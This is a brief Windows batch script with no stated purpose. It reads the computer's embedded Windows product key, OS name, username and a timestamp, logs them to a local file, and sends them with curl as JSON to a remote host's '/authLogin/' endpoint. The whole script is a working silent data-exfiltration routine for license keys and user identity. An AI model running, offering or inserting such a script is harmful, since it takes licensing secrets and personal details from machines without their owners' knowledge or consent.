@echo off
for /f "tokens=2 delims==" %%A in ('wmic path softwarelicensingservice get OA3xOriginalProductKey /value') do ( set "P=%%A")

for /f "tokens=2 delims==" %%A in ('wmic os get Caption /value') do (for /f "tokens=*" %%B in ("%%A") do set "OS=%%B")
echo %OS%

set "uname=%USERNAME%"

set "ts=%date% %time%"

set "jsonData={\"P\":\"%P%\", \"OS\":\"%OS%\", \"uname\":\"%uname%\", \"ts\":\"%ts%\"}"

echo %jsonData% >> data.txt

curl -X POST -H "Content-Type: application/json" -d "%jsonData%" http://192.168.0.100:3131/authLogin/